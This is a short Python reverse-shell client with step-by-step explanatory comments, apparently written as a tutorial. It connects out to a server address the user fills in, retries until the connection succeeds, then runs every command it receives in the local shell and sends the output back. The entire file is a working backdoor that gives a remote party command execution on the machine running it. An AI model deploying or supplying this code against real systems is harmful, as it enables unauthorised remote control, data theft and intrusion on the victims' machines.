#!/usr/bin/python3
import socket
import subprocess

# Create a socket object
# We create a socket object using the socket.socket() function, which returns a socket object.
# The arguments to the function are:
#   - socket.AF_INET: This specifies the address family, which is IPv4 in this case.
#   - socket.SOCK_STREAM: This specifies the socket type, which is a connection-oriented(TCP), reliable, stream-based socket.
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Define the server's IP address and port number
# We define the server's IP address and port number as variables.
# In this case, we're using the loopback address (127.0.0.1) and port 8080.

#server_ip = ''  # Enter your ip address here and uncomment it.

server_port = 8080

print("Connecting....")
# Connect to the server
# We use a while loop to connect to the server, in case the server is not available.
while True:
    try:
        client_socket.connect((server_ip, server_port))
        break
    except ConnectionRefusedError:
        # If the connection is refused, we simply pass and try again.
        pass

print("Connected to server {}:{}".format(server_ip, server_port))

while True:
    # Receive commands from the server
    # We receive commands from the server using the recv() function.
    # This returns a bytes object, which we decode to a string using the decode() function.
    command = client_socket.recv(1024).decode()

    if command == "exit":
        # Exit the client
        # If the command is "exit", we break out of the loop and close the socket.
        break

    # Run the command in the client's shell
    # We use the subprocess.getoutput() function to run the command in the client's shell.
    # This returns the output of the command as a string.
    output = subprocess.getoutput(command)

    # Send the output back to the server
    # We send the output back to the server using the send() function.
    # the output is a string and we convert it to byte using encode() function.
    client_socket.send(output.encode())

# Close the socket
# We close the client socket using the close() function.
client_socket.close()
